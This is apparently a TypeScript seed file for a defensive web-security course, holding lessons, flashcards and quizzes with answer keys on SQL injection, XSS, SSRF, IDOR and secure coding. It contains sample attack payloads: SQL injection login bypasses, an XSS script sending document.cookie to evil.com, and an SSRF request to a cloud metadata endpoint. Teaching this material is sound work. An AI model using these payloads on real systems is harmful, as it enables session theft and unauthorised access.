import type { SeedCourse } from "./types";

export const course3: SeedCourse = {
  slug: "web-security-fundamentals",
  title: "Web Security Fundamentals",
  subtitle: "Break and defend web applications",
  description:
    "Web apps are the most attacked surface on the internet. Learn how HTTP works, then work through the vulnerabilities that dominate the OWASP Top 10 — injection, broken authentication, XSS, SSRF, and access control flaws — understanding both how they're exploited and how to defend against them.",
  category: "RED_TEAM",
  difficulty: "MEDIUM",
  estimatedHrs: 18,
  order: 3,
  prerequisites: ["cybersecurity-fundamentals"],
  objectives: [
    "Explain the HTTP request/response cycle and key headers",
    "Exploit and prevent SQL injection",
    "Understand authentication and session weaknesses",
    "Identify and defend against XSS in all its forms",
    "Recognise SSRF and access-control flaws",
    "Apply secure coding practices to real code",
  ],
  modules: [
    // ─── Module 1 ───────────────────────────────────────────────
    {
      title: "HTTP Basics",
      description: "The protocol behind every web attack.",
      lessons: [
        {
          title: "The Request/Response Cycle",
          summary: "How the web actually talks.",
          durationMin: 8,
          blocks: [
            { type: "TEXT", text: "The web runs on **HTTP** — a simple request/response protocol. Your browser sends a **request**; the server sends back a **response**. Understanding this cycle is the foundation of all web security." },
            { type: "CODE", language: "http", caption: "A raw HTTP request", code: "GET /profile?id=42 HTTP/1.1\nHost: example.com\nCookie: session=abc123\nUser-Agent: Mozilla/5.0" },
            { type: "TEXT", text: "Key parts: the **method** (`GET`), the **path** (`/profile?id=42`), **headers** (metadata like the session cookie), and — for `POST` requests — a **body** carrying data. Every one of these is attacker-controllable, which is exactly why web security is hard." },
            { type: "CALLOUT", variant: "important", title: "The golden rule of web security", text: "Never trust anything that comes from the client. Every header, parameter, cookie, and body field can be forged by an attacker using simple tools." },
            { type: "KNOWLEDGE_CHECK", question: "In the request above, which part could an attacker NOT trivially change?", options: [
              { id: "A", text: "The path /profile?id=42" },
              { id: "B", text: "The Cookie header" },
              { id: "C", text: "The User-Agent" },
              { id: "D", text: "None — an attacker can forge all of these" },
            ], correct: "D", explanation: "Everything in an HTTP request is client-controlled and forgeable. That's why servers must validate and never trust client input." },
          ],
          flashcards: [
            { front: "What are the key parts of an HTTP request?", back: "Method, path, headers, and (for POST) a body." },
            { front: "The golden rule of web security?", back: "Never trust client input — every header, parameter, and cookie can be forged." },
          ],
        },
        {
          title: "Status Codes, Methods & Cookies",
          summary: "The vocabulary of HTTP.",
          durationMin: 7,
          blocks: [
            { type: "TEXT", text: "**Methods**: `GET` (read), `POST` (create/submit), `PUT` (update), `DELETE` (remove).\n\n**Status codes** tell you what happened: `200` OK, `301/302` redirect, `403` forbidden, `404` not found, `500` server error. To an attacker, a `403` vs `404` can leak whether a resource exists.\n\n**Cookies** store state between requests — most importantly, **session cookies** that keep you logged in. Steal a session cookie and you become that user." },
            { type: "CALLOUT", variant: "warning", title: "Protect session cookies", text: "Session cookies should be flagged HttpOnly (unreadable by JavaScript, blunting XSS theft) and Secure (only sent over HTTPS). Missing these flags is a common, serious finding." },
            { type: "KNOWLEDGE_CHECK", question: "Why should a session cookie have the HttpOnly flag?", options: [
              { id: "A", text: "So it loads faster" },
              { id: "B", text: "So JavaScript cannot read it, reducing theft via XSS" },
              { id: "C", text: "So it never expires" },
              { id: "D", text: "So it works without HTTPS" },
            ], correct: "B", explanation: "HttpOnly stops client-side JavaScript from reading the cookie, which blunts session theft through cross-site scripting." },
          ],
          flashcards: [
            { front: "What does HTTP 403 vs 404 mean?", back: "403 = forbidden (exists but no access); 404 = not found. The difference can leak whether a resource exists." },
            { front: "What do HttpOnly and Secure cookie flags do?", back: "HttpOnly = JavaScript can't read the cookie (limits XSS theft). Secure = only sent over HTTPS." },
          ],
        },
      ],
      quiz: {
        title: "Module 1 Quiz: HTTP",
        questions: [
          { type: "MULTIPLE_CHOICE", question: "Which HTTP method is typically used to submit new data?", options: ["GET", "POST", "HEAD", "TRACE"], correct: "POST" },
          { type: "MULTIPLE_CHOICE", question: "HTTP status 403 means:", options: ["OK", "Redirect", "Forbidden", "Server error"], correct: "Forbidden" },
          { type: "MULTIPLE_CHOICE", question: "The cookie flag that blocks JavaScript access is:", options: ["Secure", "HttpOnly", "SameSite", "Path"], correct: "HttpOnly" },
          { type: "TRUE_FALSE", question: "You can trust HTTP headers because browsers set them.", correct: "false", explanation: "Any header can be forged by an attacker; never trust client input." },
          { type: "MULTIPLE_CHOICE", question: "Stealing a valid session cookie lets an attacker:", options: ["Crash the server", "Impersonate the logged-in user", "Read the source code", "Bypass HTTPS"], correct: "Impersonate the logged-in user" },
        ],
      },
    },

    // ─── Module 2 ───────────────────────────────────────────────
    {
      title: "Authentication",
      description: "Getting login right.",
      lessons: [
        {
          title: "Password Storage & Hashing",
          summary: "Never store what you can hash.",
          durationMin: 8,
          blocks: [
            { type: "TEXT", text: "The cardinal sin of authentication is storing passwords in **plaintext**. If the database leaks, every account is instantly compromised — and users reuse passwords elsewhere.\n\nInstead, store a **hash**: a one-way transformation. When a user logs in, you hash their input and compare. But not any hash — you need a **slow, salted** password hash like **bcrypt**, **scrypt**, or **Argon2**." },
            { type: "CALLOUT", variant: "danger", title: "MD5 and SHA-256 are NOT for passwords", text: "General-purpose hashes are far too fast — an attacker can try billions per second. Password hashes are deliberately slow. And a unique 'salt' per password stops attackers using precomputed rainbow tables." },
            { type: "KNOWLEDGE_CHECK", question: "Why is bcrypt preferred over SHA-256 for storing passwords?", options: [
              { id: "A", text: "bcrypt is faster" },
              { id: "B", text: "bcrypt is deliberately slow and salted, resisting brute-force cracking" },
              { id: "C", text: "SHA-256 is reversible" },
              { id: "D", text: "bcrypt encrypts, SHA-256 doesn't" },
            ], correct: "B", explanation: "Password hashes should be slow and salted. bcrypt is designed for this; SHA-256 is a fast general hash that attackers can brute-force billions of times per second." },
          ],
          flashcards: [
            { front: "Why not store passwords in plaintext?", back: "A database leak instantly exposes every account — and users reuse passwords elsewhere." },
            { front: "Name three good password-hashing algorithms.", back: "bcrypt, scrypt, Argon2 — slow and salted by design." },
            { front: "What does a salt prevent?", back: "Precomputed rainbow-table attacks, by making each password's hash unique." },
          ],
        },
        {
          title: "Sessions, Tokens & Brute Force",
          summary: "Staying logged in, safely.",
          durationMin: 7,
          blocks: [
            { type: "TEXT", text: "After login, the server issues a **session token** (a cookie) or a **JWT** to remember you. These must be:\n\n- **Random and long** — unguessable.\n- **Expired** appropriately — not valid forever.\n- **Invalidated** on logout.\n\nLogin endpoints also need **brute-force protection**: rate limiting, account lockouts, and CAPTCHA slow down attackers guessing passwords. And **MFA** dramatically raises the bar even if a password leaks." },
            { type: "KNOWLEDGE_CHECK", question: "An attacker tries thousands of passwords against one login form. Which control most directly stops this?", options: [
              { id: "A", text: "HTTPS" },
              { id: "B", text: "Rate limiting / account lockout on the login endpoint" },
              { id: "C", text: "A longer domain name" },
              { id: "D", text: "Compressing responses" },
            ], correct: "B", explanation: "Rate limiting and lockouts directly throttle password-guessing. MFA adds another layer, but rate limiting is the direct control against brute force." },
          ],
          flashcards: [
            { front: "Three properties a session token must have?", back: "Random/long (unguessable), properly expiring, and invalidated on logout." },
            { front: "Which controls defend a login form against brute force?", back: "Rate limiting, account lockout, CAPTCHA — and MFA to limit impact if a password leaks." },
          ],
        },
      ],
      quiz: {
        title: "Module 2 Quiz: Authentication",
        questions: [
          { type: "MULTIPLE_CHOICE", question: "Passwords should be stored using:", options: ["Plaintext", "MD5", "A slow salted hash like bcrypt", "Base64"], correct: "A slow salted hash like bcrypt" },
          { type: "MULTIPLE_CHOICE", question: "A salt prevents:", options: ["Slow logins", "Rainbow-table attacks", "HTTPS errors", "Session expiry"], correct: "Rainbow-table attacks" },
          { type: "MULTIPLE_CHOICE", question: "The direct defence against password brute-forcing is:", options: ["Rate limiting / lockout", "Bigger fonts", "Caching", "Gzip"], correct: "Rate limiting / lockout" },
          { type: "TRUE_FALSE", question: "SHA-256 is an ideal algorithm for storing passwords.", correct: "false", explanation: "It's too fast; use bcrypt/scrypt/Argon2." },
          { type: "MULTIPLE_CHOICE", question: "Session tokens should be:", options: ["Short and sequential", "Random, long, and expiring", "Stored in plaintext logs", "Shared between users"], correct: "Random, long, and expiring" },
        ],
      },
    },

    // ─── Module 3 ───────────────────────────────────────────────
    {
      title: "SQL Injection",
      description: "The classic that still breaks the web.",
      lessons: [
        {
          title: "How SQL Injection Works",
          summary: "When input becomes code.",
          durationMin: 9,
          blocks: [
            { type: "TEXT", text: "**SQL injection (SQLi)** happens when user input is placed directly into a database query, letting an attacker change what the query does. It's one of the oldest bugs — and still devastating." },
            { type: "CODE", language: "sql", caption: "Vulnerable code — input concatenated into the query", code: "-- The app builds:  SELECT * FROM users WHERE name = '<input>'\n-- Attacker enters:  ' OR '1'='1\n-- Resulting query:\nSELECT * FROM users WHERE name = '' OR '1'='1'" },
            { type: "TEXT", text: "Because `'1'='1'` is always true, the query returns **every** user — bypassing the filter. With more advanced payloads, attackers can extract entire databases, bypass logins, or even run system commands." },
            { type: "CALLOUT", variant: "danger", title: "The root cause", text: "SQLi exists because data and code get mixed. The attacker's input escapes the 'data' context and becomes part of the SQL 'code'. Every injection vulnerability is a variation of this confusion." },
            { type: "KNOWLEDGE_CHECK", question: "Why does the input `' OR '1'='1` return all rows?", options: [
              { id: "A", text: "It deletes the WHERE clause" },
              { id: "B", text: "It adds an always-true condition, so every row matches" },
              { id: "C", text: "It crashes the database" },
              { id: "D", text: "It encrypts the query" },
            ], correct: "B", explanation: "`OR '1'='1'` is always true, so the WHERE clause matches every row — the filter is effectively bypassed." },
          ],
          flashcards: [
            { front: "What is SQL injection?", back: "When user input is inserted into a database query, letting an attacker change what the query does." },
            { front: "The root cause of all injection bugs?", back: "Data and code getting mixed — attacker input escapes the data context and becomes executable code." },
          ],
        },
        {
          title: "Preventing SQL Injection",
          summary: "Parameterise everything.",
          durationMin: 8,
          blocks: [
            { type: "TEXT", text: "The definitive fix is **parameterised queries** (also called prepared statements). Instead of gluing input into the query string, you send the query and the data **separately** — so the database always treats input as data, never as code." },
            { type: "CODE", language: "javascript", caption: "Safe — parameterised query", code: "// UNSAFE:\ndb.query(\"SELECT * FROM users WHERE name = '\" + name + \"'\");\n\n// SAFE — the ? is a placeholder; `name` can never become SQL:\ndb.query(\"SELECT * FROM users WHERE name = ?\", [name]);" },
            { type: "CALLOUT", variant: "tip", title: "Defence in depth", text: "Parameterisation is the primary fix. Layer on input validation (allow-lists), least-privilege database accounts, and an ORM that parameterises by default. Never rely on manually escaping quotes." },
            { type: "KNOWLEDGE_CHECK", question: "What is the primary, most reliable defence against SQL injection?", options: [
              { id: "A", text: "Hiding error messages" },
              { id: "B", text: "Parameterised queries / prepared statements" },
              { id: "C", text: "Using HTTPS" },
              { id: "D", text: "Renaming the database" },
            ], correct: "B", explanation: "Parameterised queries send code and data separately, so input can never be interpreted as SQL. That's the definitive fix." },
          ],
          flashcards: [
            { front: "The primary defence against SQL injection?", back: "Parameterised queries / prepared statements — send query and data separately." },
            { front: "Why is manually escaping quotes a poor defence?", back: "It's error-prone and easily bypassed; parameterisation removes the data/code confusion entirely." },
          ],
        },
        {
          title: "Mini Assessment: Spot the SQLi",
          summary: "Review code like a pentester.",
          durationMin: 6,
          blocks: [
            { type: "CODE", language: "python", caption: "Login handler under review", code: "user = request.form['user']\npw   = request.form['pass']\nq = f\"SELECT * FROM users WHERE user='{user}' AND pass='{pw}'\"\nrows = db.execute(q)\nif rows: login_success()" },
            { type: "KNOWLEDGE_CHECK", question: "What could an attacker type into the `user` field to log in without a valid password?", options: [
              { id: "A", text: "admin" },
              { id: "B", text: "admin'-- (comments out the password check)" },
              { id: "C", text: "A very long random string" },
              { id: "D", text: "Nothing — this code is safe" },
            ], correct: "B", explanation: "Entering admin'-- turns the query into ...WHERE user='admin'--' AND pass='...'. The -- comments out the password check, logging the attacker in as admin. The fix: parameterise the query." },
          ],
          flashcards: [
            { front: "How does the payload admin'-- bypass a login?", back: "The -- comments out the rest of the SQL (including the password check), so only the username condition remains." },
          ],
        },
      ],
      quiz: {
        title: "Module 3 Quiz: SQL Injection",
        questions: [
          { type: "MULTIPLE_CHOICE", question: "SQL injection happens when:", options: ["Passwords are too short", "User input is treated as part of a SQL query", "HTTPS is disabled", "Cookies expire"], correct: "User input is treated as part of a SQL query" },
          { type: "MULTIPLE_CHOICE", question: "The definitive fix for SQLi is:", options: ["Hiding errors", "Parameterised queries", "Longer passwords", "Rate limiting"], correct: "Parameterised queries" },
          { type: "MULTIPLE_CHOICE", question: "The payload ' OR '1'='1 works because it:", options: ["Deletes data", "Creates an always-true condition", "Encrypts the query", "Crashes the server"], correct: "Creates an always-true condition" },
          { type: "TRUE_FALSE", question: "Manually escaping quotes is a fully reliable defence against SQLi.", correct: "false", explanation: "It's error-prone; parameterisation is the reliable fix." },
          { type: "MULTIPLE_CHOICE", question: "The -- sequence in a SQLi payload is used to:", options: ["Add a row", "Comment out the rest of the query", "Encrypt input", "Speed up the query"], correct: "Comment out the rest of the query" },
        ],
      },
    },

    // ─── Module 4 ───────────────────────────────────────────────
    {
      title: "Cross-Site Scripting (XSS)",
      description: "Injecting scripts into other users' browsers.",
      lessons: [
        {
          title: "How XSS Works",
          summary: "Your script, their browser.",
          durationMin: 9,
          blocks: [
            { type: "TEXT", text: "**Cross-Site Scripting (XSS)** lets an attacker inject JavaScript that runs in *another user's* browser, in the context of the vulnerable site. That script can steal cookies, capture keystrokes, or perform actions as the victim.\n\nThree main types:\n**Stored XSS** — the payload is saved on the server (e.g. in a comment) and served to every viewer.\n**Reflected XSS** — the payload bounces off the server from a crafted link.\n**DOM-based XSS** — the flaw is entirely in client-side JavaScript." },
            { type: "CODE", language: "html", caption: "A classic stored-XSS payload in a comment field", code: "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>" },
            { type: "CALLOUT", variant: "danger", title: "Why XSS is dangerous", text: "It runs with the victim's privileges on the trusted site. If they're an admin, the attacker's script can do anything the admin can — including stealing the session cookie to hijack the account." },
            { type: "KNOWLEDGE_CHECK", question: "A malicious script saved in a blog comment runs for everyone who views the page. This is which type of XSS?", options: [
              { id: "A", text: "Reflected XSS" },
              { id: "B", text: "Stored XSS" },
              { id: "C", text: "DOM-based XSS" },
              { id: "D", text: "SQL injection" },
            ], correct: "B", explanation: "A payload persisted on the server and served to all viewers is stored XSS — the most impactful variety." },
          ],
          flashcards: [
            { front: "What is XSS?", back: "Cross-Site Scripting — injecting JavaScript that runs in another user's browser in the vulnerable site's context." },
            { front: "Stored vs Reflected XSS?", back: "Stored = payload saved on the server, served to all viewers. Reflected = payload bounces off the server from a crafted link." },
          ],
        },
        {
          title: "Preventing XSS",
          summary: "Encode output, validate input.",
          durationMin: 8,
          blocks: [
            { type: "TEXT", text: "The core defence is **output encoding** (a.k.a. escaping): when you render user data into a page, convert dangerous characters so the browser treats them as text, not code. `<script>` becomes `&lt;script&gt;` — displayed, not executed.\n\nLayer on:\n- **Input validation** — reject unexpected input at the boundary.\n- **Content Security Policy (CSP)** — a header that restricts what scripts can run, blunting XSS even if a payload slips through.\n- **Framework auto-escaping** — React, for example, escapes by default (until you use `dangerouslySetInnerHTML`)." },
            { type: "KNOWLEDGE_CHECK", question: "The primary defence against XSS when displaying user-supplied data is to:", options: [
              { id: "A", text: "Encode/escape the output so it renders as text, not code" },
              { id: "B", text: "Use a longer session cookie" },
              { id: "C", text: "Switch to HTTP" },
              { id: "D", text: "Store the data in SQL" },
            ], correct: "A", explanation: "Output encoding ensures user data is shown as inert text rather than executed as markup or script — the core XSS defence." },
          ],
          flashcards: [
            { front: "Primary defence against XSS?", back: "Output encoding/escaping — render user data as text, not executable code." },
            { front: "What does a Content Security Policy (CSP) do?", back: "Restricts which scripts a page can run, reducing XSS impact even if a payload gets through." },
          ],
        },
      ],
      quiz: {
        title: "Module 4 Quiz: XSS",
        questions: [
          { type: "MULTIPLE_CHOICE", question: "XSS allows an attacker to:", options: ["Read the database directly", "Run JavaScript in another user's browser", "Crash the server", "Bypass HTTPS"], correct: "Run JavaScript in another user's browser" },
          { type: "MULTIPLE_CHOICE", question: "A payload stored on the server and shown to all viewers is:", options: ["Reflected XSS", "Stored XSS", "DOM XSS", "CSRF"], correct: "Stored XSS" },
          { type: "MULTIPLE_CHOICE", question: "The primary defence against XSS is:", options: ["Output encoding", "Rate limiting", "Password hashing", "Port filtering"], correct: "Output encoding" },
          { type: "TRUE_FALSE", question: "A Content Security Policy can reduce XSS impact.", correct: "true" },
          { type: "MULTIPLE_CHOICE", question: "HttpOnly cookies help against XSS by:", options: ["Encrypting the page", "Preventing JavaScript from reading the cookie", "Blocking SQL", "Speeding up rendering"], correct: "Preventing JavaScript from reading the cookie" },
        ],
      },
    },

    // ─── Module 5 ───────────────────────────────────────────────
    {
      title: "SSRF & Request Forgery",
      description: "Making the server attack itself.",
      lessons: [
        {
          title: "Server-Side Request Forgery",
          summary: "Tricking the server into fetching things.",
          durationMin: 8,
          blocks: [
            { type: "TEXT", text: "**SSRF (Server-Side Request Forgery)** tricks a server into making requests on the attacker's behalf. If an app fetches a URL you supply (e.g. 'import from URL'), an attacker can point it at **internal** systems the server can reach but they can't." },
            { type: "CODE", language: "text", caption: "Abusing a URL-fetch feature", code: "Intended:  https://api.example.com/data\nAttacker:  http://169.254.169.254/latest/meta-data/\n           (cloud metadata endpoint — can leak credentials)" },
            { type: "CALLOUT", variant: "danger", title: "The cloud metadata risk", text: "On cloud platforms, 169.254.169.254 serves instance metadata — sometimes including temporary credentials. SSRF against it has caused major breaches (e.g. Capital One, 2019)." },
            { type: "KNOWLEDGE_CHECK", question: "SSRF is dangerous mainly because the server can reach:", options: [
              { id: "A", text: "The public internet only" },
              { id: "B", text: "Internal systems and metadata endpoints the attacker can't reach directly" },
              { id: "C", text: "Nothing of value" },
              { id: "D", text: "Only static files" },
            ], correct: "B", explanation: "The server often sits inside a trusted network and can reach internal services and cloud metadata that are off-limits to the attacker — SSRF borrows that access." },
          ],
          flashcards: [
            { front: "What is SSRF?", back: "Server-Side Request Forgery — tricking a server into making requests to targets of the attacker's choosing, often internal." },
            { front: "Why is the cloud metadata endpoint (169.254.169.254) a prime SSRF target?", back: "It can expose instance metadata and temporary credentials to whoever the server fetches it for." },
          ],
        },
        {
          title: "Defending Against SSRF",
          summary: "Allow-lists and network controls.",
          durationMin: 6,
          blocks: [
            { type: "TEXT", text: "SSRF defence works in layers:\n\n- **Allow-list** the domains/IPs the server may fetch — reject everything else.\n- **Block internal ranges** (127.0.0.1, 169.254.x.x, 10.x, 192.168.x) and metadata endpoints.\n- **Validate and re-resolve** URLs to defeat redirect and DNS tricks.\n- **Network segmentation** so the app server simply can't reach sensitive internal systems." },
            { type: "KNOWLEDGE_CHECK", question: "Which is the strongest SSRF defence for a URL-fetch feature?", options: [
              { id: "A", text: "Blocking the word 'http'" },
              { id: "B", text: "An allow-list of permitted destinations plus blocking internal ranges" },
              { id: "C", text: "Using a longer timeout" },
              { id: "D", text: "Hiding the feature in the UI" },
            ], correct: "B", explanation: "An allow-list of exactly which destinations are permitted, combined with blocking internal/metadata ranges, is the robust approach. Deny-lists of keywords are easily bypassed." },
          ],
          flashcards: [
            { front: "Strongest SSRF defence?", back: "An allow-list of permitted destinations, plus blocking internal/metadata IP ranges and network segmentation." },
          ],
        },
      ],
      quiz: {
        title: "Module 5 Quiz: SSRF",
        questions: [
          { type: "MULTIPLE_CHOICE", question: "SSRF makes the ___ send requests chosen by the attacker.", options: ["browser", "server", "database", "firewall"], correct: "server" },
          { type: "MULTIPLE_CHOICE", question: "A classic SSRF target on cloud hosts is:", options: ["8.8.8.8", "169.254.169.254", "127.0.0.53", "192.0.2.1"], correct: "169.254.169.254" },
          { type: "MULTIPLE_CHOICE", question: "The strongest SSRF defence is:", options: ["Keyword deny-lists", "Allow-listing destinations + blocking internal ranges", "Longer timeouts", "Hiding the feature"], correct: "Allow-listing destinations + blocking internal ranges" },
          { type: "TRUE_FALSE", question: "SSRF can expose internal systems the attacker can't reach directly.", correct: "true" },
        ],
      },
    },

    // ─── Module 6 ───────────────────────────────────────────────
    {
      title: "Access Control",
      description: "Enforcing who can do what.",
      lessons: [
        {
          title: "Broken Access Control & IDOR",
          summary: "The #1 web risk.",
          durationMin: 8,
          blocks: [
            { type: "TEXT", text: "**Broken access control** is the OWASP Top 10 #1 risk. It means users can act outside their intended permissions — reading others' data, or performing admin actions they shouldn't.\n\nThe most common form is **IDOR** (Insecure Direct Object Reference): the app trusts an ID from the request without checking ownership." },
            { type: "CODE", language: "text", caption: "An IDOR vulnerability", code: "You view your invoice:   GET /invoice?id=1001\nYou change the number:   GET /invoice?id=1002\n... and see someone else's invoice — because the server\nnever checked that invoice 1002 belongs to YOU." },
            { type: "CALLOUT", variant: "important", title: "Authorise every request server-side", text: "The server must verify, on every request, that the current user is allowed to access the specific object. Never rely on the UI hiding a button or an ID being 'hard to guess'." },
            { type: "KNOWLEDGE_CHECK", question: "Changing `?id=1001` to `?id=1002` and seeing another user's data is called:", options: [
              { id: "A", text: "SQL injection" },
              { id: "B", text: "IDOR (Insecure Direct Object Reference)" },
              { id: "C", text: "XSS" },
              { id: "D", text: "SSRF" },
            ], correct: "B", explanation: "Accessing objects by manipulating a reference the server fails to authorise is IDOR — a form of broken access control." },
          ],
          flashcards: [
            { front: "What is IDOR?", back: "Insecure Direct Object Reference — accessing objects by changing an ID the server fails to check ownership of." },
            { front: "What is the #1 OWASP Top 10 risk?", back: "Broken Access Control." },
            { front: "How do you prevent IDOR?", back: "Authorise every request server-side — verify the current user owns/may access the specific object." },
          ],
        },
        {
          title: "Privilege Escalation & CSRF",
          summary: "Gaining rights, and forged actions.",
          durationMin: 7,
          blocks: [
            { type: "TEXT", text: "**Privilege escalation** is moving from lower to higher access — a normal user becoming admin. **Vertical** escalation gains higher privileges; **horizontal** accesses another user's data at the same level (IDOR is horizontal).\n\n**CSRF (Cross-Site Request Forgery)** tricks a logged-in user's browser into sending a request they didn't intend — e.g. a hidden form that changes their email. Defend with **anti-CSRF tokens** and the **SameSite** cookie attribute." },
            { type: "KNOWLEDGE_CHECK", question: "A malicious page silently makes your browser submit a 'change email' request to a site you're logged into. This is:", options: [
              { id: "A", text: "XSS" },
              { id: "B", text: "CSRF (Cross-Site Request Forgery)" },
              { id: "C", text: "SQL injection" },
              { id: "D", text: "SSRF" },
            ], correct: "B", explanation: "Forcing a victim's authenticated browser to send an unintended request is CSRF. Anti-CSRF tokens and SameSite cookies defend against it." },
          ],
          flashcards: [
            { front: "Vertical vs horizontal privilege escalation?", back: "Vertical = gaining higher privileges (user → admin). Horizontal = accessing another user's data at the same level." },
            { front: "What is CSRF, and how do you defend against it?", back: "Tricking a logged-in user's browser into an unintended request. Defend with anti-CSRF tokens and SameSite cookies." },
          ],
        },
      ],
      quiz: {
        title: "Module 6 Quiz: Access Control",
        questions: [
          { type: "MULTIPLE_CHOICE", question: "The OWASP Top 10 #1 risk is:", options: ["XSS", "Broken Access Control", "SSRF", "Misconfiguration"], correct: "Broken Access Control" },
          { type: "MULTIPLE_CHOICE", question: "Editing a URL id to view another user's record is:", options: ["CSRF", "IDOR", "XSS", "SQLi"], correct: "IDOR" },
          { type: "MULTIPLE_CHOICE", question: "Forcing an authenticated browser to send an unintended request is:", options: ["CSRF", "SSRF", "IDOR", "XSS"], correct: "CSRF" },
          { type: "TRUE_FALSE", question: "Hiding a button in the UI is sufficient access control.", correct: "false", explanation: "Authorisation must be enforced server-side on every request." },
          { type: "MULTIPLE_CHOICE", question: "A user becoming admin is which escalation?", options: ["Horizontal", "Vertical", "Lateral", "Diagonal"], correct: "Vertical" },
        ],
      },
    },

    // ─── Module 7 ───────────────────────────────────────────────
    {
      title: "Secure Coding",
      description: "Building it right from the start.",
      lessons: [
        {
          title: "Secure Coding Principles",
          summary: "Habits that prevent whole bug classes.",
          durationMin: 8,
          blocks: [
            { type: "TEXT", text: "Most vulnerabilities come from a handful of repeated mistakes. A few principles prevent entire classes of bugs:\n\n- **Validate input** at every boundary, using allow-lists.\n- **Encode output** for the context (HTML, SQL, shell).\n- **Parameterise** database queries — never concatenate.\n- **Least privilege** for every component and account.\n- **Fail securely** — errors should deny, not grant, access.\n- **Don't roll your own crypto** — use vetted libraries." },
            { type: "CALLOUT", variant: "tip", title: "Shift left", text: "Fixing a bug in design costs a fraction of fixing it in production. Threat-modelling and secure defaults early ('shift left') is far cheaper than patching breaches later." },
            { type: "KNOWLEDGE_CHECK", question: "'Fail securely' means that when something goes wrong, the system should:", options: [
              { id: "A", text: "Grant access to keep things working" },
              { id: "B", text: "Default to denying access" },
              { id: "C", text: "Delete all data" },
              { id: "D", text: "Ignore the error" },
            ], correct: "B", explanation: "Failing securely means the default on error is to deny — never to fall open and grant access." },
          ],
          flashcards: [
            { front: "Name four secure-coding principles.", back: "Validate input, encode output, parameterise queries, apply least privilege (also: fail securely, don't roll your own crypto)." },
            { front: "What does 'shift left' mean?", back: "Address security early in design/development, where fixes are far cheaper than post-breach patching." },
          ],
        },
        {
          title: "Dependencies & Secrets",
          summary: "The risks you inherit and the secrets you leak.",
          durationMin: 7,
          blocks: [
            { type: "TEXT", text: "Modern apps are mostly **third-party dependencies** — and their vulnerabilities become yours. Use **software composition analysis** (e.g. `npm audit`, Dependabot) to track and patch vulnerable libraries.\n\nAnd never commit **secrets** — API keys, passwords, tokens — into source code. They leak through git history, public repos, and logs. Use environment variables or a secrets manager, and scan commits for accidental secrets." },
            { type: "CALLOUT", variant: "warning", title: "Git never forgets", text: "Committing a secret and deleting it in the next commit doesn't help — it's still in the history. Assume any secret ever committed is compromised and rotate it." },
            { type: "KNOWLEDGE_CHECK", question: "You accidentally committed an API key, then removed it in the next commit. What must you do?", options: [
              { id: "A", text: "Nothing — it's deleted now" },
              { id: "B", text: "Treat the key as compromised and rotate it immediately" },
              { id: "C", text: "Rename the file" },
              { id: "D", text: "Make the repo private for a day" },
            ], correct: "B", explanation: "The key remains in git history and may already be scraped. Rotate it — assume any committed secret is compromised." },
          ],
          flashcards: [
            { front: "How should secrets be handled in code?", back: "Never commit them — use environment variables or a secrets manager, and scan for accidental commits." },
            { front: "Why rotate a secret that was committed then deleted?", back: "It still lives in git history and may already be scraped — assume it's compromised." },
          ],
        },
      ],
      quiz: {
        title: "Module 7 Quiz: Secure Coding",
        questions: [
          { type: "MULTIPLE_CHOICE", question: "'Fail securely' means on error the system should:", options: ["Grant access", "Deny access by default", "Crash", "Log the user in"], correct: "Deny access by default" },
          { type: "MULTIPLE_CHOICE", question: "Committing an API key and deleting it next commit means you should:", options: ["Do nothing", "Rotate the key", "Rename the repo", "Add a comment"], correct: "Rotate the key" },
          { type: "MULTIPLE_CHOICE", question: "Tracking vulnerable third-party libraries is called:", options: ["Threat modelling", "Software composition analysis", "Penetration testing", "Fuzzing"], correct: "Software composition analysis" },
          { type: "TRUE_FALSE", question: "You should write your own encryption algorithms for best security.", correct: "false", explanation: "Use vetted, well-reviewed libraries — never roll your own crypto." },
          { type: "MULTIPLE_CHOICE", question: "Addressing security early in the lifecycle is called:", options: ["Shift right", "Shift left", "Fail open", "Hard-coding"], correct: "Shift left" },
        ],
      },
    },

    // ─── Module 8 ───────────────────────────────────────────────
    {
      title: "Final Assessment: Web Security",
      description: "Diagnose a vulnerable app.",
      lessons: [
        {
          title: "Applied Review",
          summary: "Find the flaws.",
          durationMin: 9,
          blocks: [
            { type: "TEXT", text: "You're reviewing a web app. You observe three things:\n1. The login query concatenates the username directly into SQL.\n2. Comments are rendered onto the page exactly as typed.\n3. `GET /orders?id=55` shows your order; changing to `id=56` shows someone else's." },
            { type: "KNOWLEDGE_CHECK", question: "Observation 1 (username concatenated into SQL) is which vulnerability?", options: [
              { id: "A", text: "XSS" },
              { id: "B", text: "SQL injection" },
              { id: "C", text: "CSRF" },
              { id: "D", text: "SSRF" },
            ], correct: "B", explanation: "Concatenating input into a SQL query is the definition of SQL injection. Fix: parameterised queries." },
            { type: "KNOWLEDGE_CHECK", question: "Observation 2 (comments rendered exactly as typed) is which vulnerability?", options: [
              { id: "A", text: "Stored XSS" },
              { id: "B", text: "SQL injection" },
              { id: "C", text: "IDOR" },
              { id: "D", text: "SSRF" },
            ], correct: "A", explanation: "Rendering user comments without encoding allows stored XSS. Fix: output encoding / escaping." },
            { type: "KNOWLEDGE_CHECK", question: "Observation 3 (changing id to view others' orders) is which vulnerability?", options: [
              { id: "A", text: "XSS" },
              { id: "B", text: "IDOR / broken access control" },
              { id: "C", text: "SQL injection" },
              { id: "D", text: "CSRF" },
            ], correct: "B", explanation: "Accessing others' orders by changing the id is IDOR — broken access control. Fix: authorise every request server-side." },
          ],
          flashcards: [
            { front: "Fixes for SQLi, XSS, and IDOR respectively?", back: "SQLi → parameterised queries. XSS → output encoding. IDOR → server-side authorisation on every request." },
          ],
        },
      ],
      quiz: {
        title: "Final Assessment: Web Security Fundamentals",
        passMark: 70,
        questions: [
          { type: "MULTIPLE_CHOICE", question: "Concatenating user input into a database query causes:", options: ["XSS", "SQL injection", "CSRF", "SSRF"], correct: "SQL injection" },
          { type: "MULTIPLE_CHOICE", question: "Rendering user comments without escaping causes:", options: ["Stored XSS", "IDOR", "SSRF", "Brute force"], correct: "Stored XSS" },
          { type: "MULTIPLE_CHOICE", question: "Viewing others' records by changing an id is:", options: ["IDOR", "XSS", "CSRF", "SQLi"], correct: "IDOR" },
          { type: "MULTIPLE_CHOICE", question: "The fix for SQL injection is:", options: ["Output encoding", "Parameterised queries", "SameSite cookies", "Rate limiting"], correct: "Parameterised queries" },
          { type: "MULTIPLE_CHOICE", question: "Passwords should be stored with:", options: ["SHA-256", "Plaintext", "bcrypt/Argon2", "Base64"], correct: "bcrypt/Argon2" },
